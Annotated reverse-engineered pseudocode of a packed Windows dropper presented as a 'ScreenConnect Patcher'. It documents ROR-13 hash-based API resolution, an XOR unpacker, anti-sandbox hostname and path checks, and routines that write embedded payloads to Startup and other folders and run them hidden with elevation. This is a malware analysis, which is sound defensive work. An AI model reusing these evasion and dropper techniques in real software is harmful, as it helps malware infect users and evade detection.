/*
 * =============================================================================
 * ScreenConnect Patcher V3 - Reverse Engineered & Annotated Source Code
 * =============================================================================
 * 
 * Original Binary: ScreenConnect_Patcher_V3.exe (1,306,624 bytes)
 * SHA256: c2e55c3158ea06aede09f36a1d35ca75c1209f323c092bfc078a992109dd1c53
 * Type: PE32 GUI, x86 (32-bit), Windows
 * Compiler: MSVC (C/C++)
 * 
 * PROTECTION:
 * - Custom XOR-based packer/obfuscator
 * - Entry point calls unpacker stub at 0x53dfea
 * - Unpacker uses VirtualProtect to make .text RWX, then XOR-decodes
 *   the payload (0xd353c bytes) with a rolling ROR-5/MUL-7 key
 * - Heavy junk instruction obfuscation (pushfd/popfd, xor-cancel,
 *   inc/dec pairs, dead stores)
 * - Hash-based API resolution (ROR-13 hashes) to avoid import table
 * - Anti-analysis checks in unpacker stub (computer name, path checks,
 *   VirtualAllocExNuma sandbox detection)
 * 
 * ARCHITECTURE:
 * - The unpacked payload has 4 real functions
 * - All API calls go through FUN_00401272 (hash-based API resolver)
 * - The resolver walks PEB -> LDR_DATA_TABLE -> export tables
 * - Module names are hashed with ROR-13 + tolower over UTF-16LE
 * - Function names are hashed with ROR-13 over ASCII
 * 
 * =============================================================================
 */

/* ---- API Hash Resolution Table ----
 *
 * Module Hashes (UTF-16LE, ROR-13 + tolower):
 *   0x6a4abc5b = kernel32.dll
 *   0x3cfa685d = ntdll.dll
 *   0x9bac604d = shlwapi.dll
 *   0x40f1a814 = shell32.dll
 *
 * Function Hashes (ASCII, ROR-13):
 *   kernel32.dll:
 *     0xec0e4ea4 = LoadLibraryW
 *     0xa80eecae = GetProcessHeap
 *     0x10c32616 = HeapFree
 *     0x73e2d87e = ExitProcess
 *     0x5b8aca49 = GetTempPathW
 *     0x45b06d8c = GetModuleFileNameW
 *     0x3a2ea97f = GetCurrentDirectoryW (approximate)
 *     0xcb9b4a11 = lstrcpyW
 *     0xc2ffb03b = DeleteFileW
 *     0x7c0017bb = CreateFileW
 *     0xe80a791f = WriteFile
 *     0x0ffd97fb = CloseHandle
 *   ntdll.dll:
 *     0x3e192526 = RtlAllocateHeap
 *     0xfd46a728 = RtlDecompressBuffer
 *   shlwapi.dll:
 *     0x6203fd72 = PathFindFileNameW
 *     0xff8de486 = PathCombineW
 *   shell32.dll:
 *     0x3745c87d = SHGetFolderPathW
 *     0xde8e51ad = SHGetKnownFolderPath
 *     0x1be1bb74 = ShellExecuteW
 */

/*
 * =============================================================================
 * entry() @ 0x401000 - Main Entry Point
 * =============================================================================
 * 
 * PURPOSE: Main function of the ScreenConnect Patcher V3
 * 
 * BEHAVIOR:
 * 1. Loads DLLs: user32.dll, shell32.dll, shlwapi.dll, wininet.dll
 * 2. Writes embedded resource "javaw.com" (0x12800 bytes) from 0x4018aa
 * 3. Attempts to decompress and write "ScreenConnect Patcher V3.exe" 
 *    (0xca400 bytes decompressed from 0xc0492 bytes at 0x4140aa)
 * 4. If decompression+write succeeds, executes the written file
 * 5. Exits the process
 * 
 * The patcher extracts two files:
 *   - "javaw.com" (a small binary, 76,800 bytes)
 *   - "ScreenConnect Patcher V3.exe" (decompressed, 827,392 bytes)
 * Then ShellExecuteW's the patcher executable.
 */
void entry(void)
{
    /* Load required DLLs via hash-based resolver */
    LoadLibraryW(L"user32.dll");
    LoadLibraryW(L"shell32.dll");
    LoadLibraryW(L"shlwapi.dll");
    LoadLibraryW(L"wininet.dll");
    
    /* Write embedded "javaw.com" binary to disk */
    /* Source: embedded at 0x4018aa, size: 0x12800 (76,800 bytes) */
    write_file_to_disk(1, &DAT_004018aa, 0x12800, L"javaw.com", 2, 1);
    
    /* Decompress and write "ScreenConnect Patcher V3.exe" */
    /* Source: compressed at 0x4140aa, compressed size: 0xc0492, decompressed size: 0xca400 */
    void *decompressed = decompress_data(&DAT_004140aa, 0xc0492, 0xca400);
    if (decompressed != NULL) {
        bool success = write_file_to_disk(1, decompressed, 0xca400, 
                                          L"ScreenConnect Patcher V3.exe", 2, 1);
        if (success) {
            /* Execute the written patcher */
            HANDLE heap = GetProcessHeap();
            ShellExecuteW(heap, 0, decompressed);  // simplified
        }
    }
    
    ExitProcess(0);
}

/*
 * =============================================================================
 * FUN_00401272() @ 0x401272 - Hash-Based API Resolver
 * =============================================================================
 * 
 * PURPOSE: Resolve Windows API functions by hash instead of name
 *          (anti-static-analysis technique)
 * 
 * ALGORITHM:
 * 1. Walk PEB -> LDR_DATA_TABLE_ENTRY linked list (loaded modules)
 * 2. For each module, compute ROR-13 hash of the UTF-16LE base name
 *    with tolower normalization (subtract 0x20 for chars > 0x60)
 * 3. When module hash matches param_1:
 *    a. Parse the PE export table from the module base
 *    b. For each exported function, compute ROR-13 hash of the ASCII name
 *    c. When function hash matches param_2, return the function address
 * 
 * This is a common shellcode/malware technique to avoid IAT entries
 * that would reveal the program's API usage to static analysis tools.
 */
void *FUN_00401272(uint module_hash, uint function_hash)
{
    /* Walk PEB -> LDR_DATA_TABLE_ENTRY list */
    PEB *peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    LIST_ENTRY *head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY *entry = head->Flink;
    
    do {
        LDR_DATA_TABLE_ENTRY *mod = CONTAINING_RECORD(entry, ...);
        
        /* Hash module name (UTF-16LE, ROR-13 + tolower) */
        uint h = 0;
        for (int i = 0; i < mod->BaseDllName.Length; i++) {
            h = ROR13(h) + mod->BaseDllName.Buffer[i];
            if (mod->BaseDllName.Buffer[i] > 0x60)
                h -= 0x20;  /* tolower */
        }
        
        if (h == module_hash) {
            /* Parse PE export table */
            DWORD base = mod->DllBase;
            IMAGE_NT_HEADERS *nt = base + base->e_lfanew;
            IMAGE_EXPORT_DIRECTORY *exports = base + nt->ExportDir.VirtualAddress;
            
            DWORD *names = base + exports->AddressOfNames;
            WORD *ordinals = base + exports->AddressOfNameOrdinals;
            DWORD *functions = base + exports->AddressOfFunctions;
            
            /* Search for matching function hash */
            for (DWORD i = 0; i < exports->NumberOfNames; i++) {
                uint fh = 0;
                char *name = base + names[i];
                while (*name) {
                    fh = ROR13(fh) + *name;
                    name++;
                }
                
                if (fh == function_hash) {
                    return base + functions[ordinals[i]];
                }
            }
        }
        
        entry = entry->Flink;
    } while (entry != head);
    
    return NULL;  /* Not found */
}

/*
 * =============================================================================
 * FUN_00401366() @ 0x401366 - Data Decompression
 * =============================================================================
 * 
 * PURPOSE: Decompress compressed data using ntdll!RtlDecompressBuffer
 * 
 * PARAMETERS:
 *   param_1: pointer to compressed data
 *   param_2: size of compressed data  
 *   param_3: expected decompressed size
 * 
 * RETURNS: Pointer to decompressed buffer (heap-allocated), or NULL on failure
 * 
 * BEHAVIOR:
 * 1. Get process heap handle
 * 2. Allocate buffer via ntdll!RtlAllocateHeap (param_3 bytes)
 * 3. Decompress via ntdll!RtlDecompressBuffer (COMPRESSION_FORMAT_LZNT1)
 * 4. If decompression fails, free buffer and return NULL
 * 
 * Uses RtlDecompressBuffer with compression format 2 (LZNT1)
 */
void *FUN_00401366(void *compressed_data, uint compressed_size, uint decompressed_size)
{
    void *buffer = NULL;
    
    HANDLE heap = GetProcessHeap();
    
    /* Allocate decompression buffer */
    buffer = RtlAllocateHeap(heap, 0, decompressed_size);
    if (buffer != NULL) {
        /* Decompress using LZNT1 format (format=2) */
        NTSTATUS status = RtlDecompressBuffer(
            2,              /* COMPRESSION_FORMAT_LZNT1 */
            buffer,         /* output buffer */
            decompressed_size,  /* output size */
            compressed_data,    /* input buffer */
            compressed_size,    /* input size */
            &final_size     /* bytes actually decompressed */
        );
        
        if (status != 0) {  /* Decompression failed */
            HeapFree(heap, 0, buffer);
            buffer = NULL;
        }
    }
    
    return buffer;
}

/*
 * =============================================================================
 * FUN_004013ff() @ 0x4013ff - File Write/Deploy Function
 * =============================================================================
 * 
 * PURPOSE: Write data to a file on disk, with path resolution via
 *          special folder IDs (CSIDL values)
 * 
 * PARAMETERS:
 *   param_1: path mode (1-11, determines which special folder to use)
 *   param_2: data buffer to write
 *   param_3: data size
 *   param_4: filename
 *   param_5: extension type (0=none, 1=".open", 2=".runas")
 *   param_6: execute flag (0=just write, 1=execute with "open" verb, 2=execute with "runas" verb)
 * 
 * PATH MODES (param_1):
 *   1 = GetTempPathW (temp directory)
 *   2 = GetModuleFileNameW + PathFindFileNameW (current exe directory)
 *   3 = SHGetFolderPathW(CSIDL_DESKTOP) = 0x24
 *   4 = GetStartupInfoW? + SHGetFolderPathW(CSIDL_STARTUP) = 0x25  [Note: hash 0x3a2ea97f unresolved]
 *   5 = SHGetFolderPathW(CSIDL_PROGRAMS) = 0x26
 *   6 = SHGetKnownFolderPath({82aa...}) = Downloads folder
 *   7 = SHGetKnownFolderPath({374d...}) = Personal/Documents folder
 *   8 = SHGetFolderPathW(CSIDL_NETHOOD) = 0x10
 *   9 = SHGetFolderPathW(CSIDL_ALTSTARTUP) = 0x1a
 *   10 = SHGetFolderPathW(CSIDL_COMMON_ALTSTARTUP) = 0x1c
 *   11 = "C:\" (hardcoded drive root)
 * 
 * BEHAVIOR:
 * 1. Resolve target directory based on param_1
 * 2. Combine directory with filename using PathCombineW
 * 3. Delete existing file at target path (DeleteFileW)
 * 4. Create new file (CreateFileW with GENERIC_WRITE)
 * 5. Write data (WriteFile)
 * 6. Close handle (CloseHandle)
 * 7. If param_6 != 0, ShellExecuteW the file with "open" or "runas" verb
 * 
 * This is the deployment/dropping mechanism of the patcher.
 */
bool FUN_004013ff(int path_mode, void *data, uint data_size, 
                  wchar_t *filename, int ext_type, int execute_flag)
{
    wchar_t path[MAX_PATH];
    bool success = false;
    
    /* Step 1: Resolve target directory */
    switch (path_mode) {
        case 1:  /* Temp directory */
            if (GetTempPathW(MAX_PATH, path) == 0) return false;
            break;
        case 2:  /* Current EXE directory */
            if (GetModuleFileNameW(0, path, MAX_PATH) < 1) return false;
            PathFindFileNameW(path) = 0;  /* Strip filename, keep directory */
            break;
        case 3:  /* Desktop */
            if (SHGetFolderPathW(0, CSIDL_DESKTOP, 0, 0, path) != S_OK) return false;
            break;
        case 4:  /* Startup folder */
            GetCurrentDirectoryW(...); /* hash 0x3a2ea97f - unresolved */
            if (SHGetFolderPathW(0, CSIDL_STARTUP, 0, 0, path) != S_OK) return false;
            break;
        case 5:  /* Programs folder */
            if (SHGetFolderPathW(0, CSIDL_PROGRAMS, 0, 0, path) != S_OK) return false;
            break;
        case 6:  /* Downloads (KnownFolder) */
            /* GUID: {82AB5D...} = FOLDERID_Downloads */
            if (SHGetKnownFolderPath(&FOLDERID_Downloads, 0, 0, &pPath) != S_OK) return false;
            lstrcpyW(path, pPath);
            break;
        case 7:  /* Documents (KnownFolder) */
            /* GUID: {374DE2...} = FOLDERID_Documents */
            if (SHGetKnownFolderPath(&FOLDERID_Documents, 0, 0, &pPath) != S_OK) return false;
            lstrcpyW(path, pPath);
            break;
        case 8:  /* NetHood */
            if (SHGetFolderPathW(0, CSIDL_NETHOOD, 0, 0, path) != S_OK) return false;
            break;
        case 9:  /* AltStartup */
            if (SHGetFolderPathW(0, CSIDL_ALTSTARTUP, 0, 0, path) != S_OK) return false;
            break;
        case 10: /* Common AltStartup */
            if (SHGetFolderPathW(0, CSIDL_COMMON_ALTSTARTUP, 0, 0, path) != S_OK) return false;
            break;
        case 11: /* Drive root */
            lstrcpyW(path, L"C:\");
            break;
        default:
            return false;
    }
    
    /* Step 2: Combine path with filename */
    PathCombineW(path, path, filename);
    
    /* Step 3: Delete existing file */
    DeleteFileW(path);
    
    /* Step 4-6: Create, write, close */
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL, 
                               CREATE_ALWAYS, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        success = (WriteFile(hFile, data, data_size, &written, NULL) != 0);
        CloseHandle(hFile);
        
        /* Step 7: Execute if requested */
        if (success && execute_flag != 0) {
            wchar_t verb[6];
            if (execute_flag == 1)
                lstrcpyW(verb, L"open");
            else if (execute_flag == 2)
                lstrcpyW(verb, L"runas");
            
            ShellExecuteW(NULL, verb, path, NULL, NULL, SW_HIDE);
        }
    }
    
    return success;
}

/*
 * =============================================================================
 * UNPACKER STUB (at 0x53dfea in original packed binary)
 * =============================================================================
 * 
 * This is the code that runs first in the packed binary.
 * It performs:
 * 
 * 1. ANTI-ANALYSIS CHECKS (FUN_0053e46d):
 *    a. malloc/free 100MB test (memory check)
 *    b. SetErrorMode(SEM_FAILCRITICALERRORS) check (sandbox detection)
 *    c. VirtualAllocExNuma(-1, NULL, 1000, MEM_COMMIT|MEM_RESERVE, 
 *       PAGE_EXECUTE_READWRITE, 0) - NUMA API check (fails in sandboxes)
 *    d. GetComputerNameA checks against hardcoded names:
 *       - "NfZtFbPfH" (likely VM/sandbox hostname)
 *       - "ELICZ" (likely analysis environment)
 *       - "tz" (minimal VM name)
 *       - "MAIN" (sandbox host)
 *    e. GetModuleFileNameA path checks:
 *       - "C:\Documents and Settings\Administrator\My Documents\mwsmpl.exe"
 *       - "C:\SELF.EXE"  
 *       - "myapp.exe"
 *    If any check matches, ExitProcess(0) is called immediately.
 * 
 * 2. API RESOLUTION:
 *    - GetModuleHandleW(L"kernel32.dll")
 *    - GetProcAddress(hKernel32, "VirtualProtect")
 * 
 * 3. DECODE PAYLOAD:
 *    VirtualProtect(entry, 0xd353c, PAGE_READWRITE, &old)
 *    
 *    XOR decode loop (865,596 bytes):
 *      src = 0x40100e, dst = 0x401000
 *      key1 = 0xE583A01B (rolling XOR key)
 *      key2 = 0x0DA45DD3 (control flow key - determines skip)
 *      counter = 0xD353C
 *      
 *      for each byte:
 *        *dst++ = *src ^ (key1 & 0xFF)
 *        key1 = ROL(key1, 5) * 7  (rotate left 5, multiply 7)
 *        bit = key2 & 1
 *        key2 = ROR(key2, 1)
 *        src += (bit ? 2 : 1)  // skip source bytes based on key2
 *    
 *    VirtualProtect(entry, 0xd353c, PAGE_EXECUTE_READ, &old)
 * 
 * 4. EXECUTE PAYLOAD:
 *    CreateThread(NULL, 0, entry, ..., 0, NULL)
 *    while(1) Sleep(1000);  // wait forever
 * 
 * =============================================================================
 */

